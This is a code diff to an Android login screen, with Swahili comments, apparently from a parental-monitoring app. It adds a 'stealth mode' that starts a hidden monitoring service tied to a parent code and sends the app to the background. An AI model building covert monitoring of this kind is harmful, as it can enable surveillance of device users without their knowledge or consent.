@@ -38,6 +38,7 @@ public class LoginActivity extends AppCompatActivity {
         String savedCode = prefs.getString("parent_code", "");
         boolean isVerified = prefs.getBoolean("code_verified", false);
 
+        // 🔒 KAMA CODE IMEISHATHIBITISHWA, ANZA STEALTH MODE MOJA KWA MOJA
         if (!savedCode.isEmpty() && isVerified) {
             startStealthMode(savedCode);
             return;
@@ -168,7 +169,7 @@ public class LoginActivity extends AppCompatActivity {
             }
 
             if (allGranted) {
-                Toast.makeText(this, "✅ Permissions zote zimekubaliwa!", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "✅ Permissions zote zimekubaliwa! App inafichika...", Toast.LENGTH_LONG).show();
                 startStealthMode(prefs.getString("parent_code", ""));
             } else {
                 Toast.makeText(this, "⚠️ Baadhi ya permissions hazijakubaliwa.", Toast.LENGTH_LONG).show();
@@ -178,10 +179,12 @@ public class LoginActivity extends AppCompatActivity {
     }
 
     private void startStealthMode(String code) {
+        // 🔒 ANZA SERVICE NA KUFICHA APP
         Intent stealthIntent = new Intent(this, StealthService.class);
         stealthIntent.putExtra("PARENT_CODE", code);
         startService(stealthIntent);
 
+        // 🚀 TOA APP KUTOKA LAUNCHER
         moveTaskToBack(true);
         finish();
     }
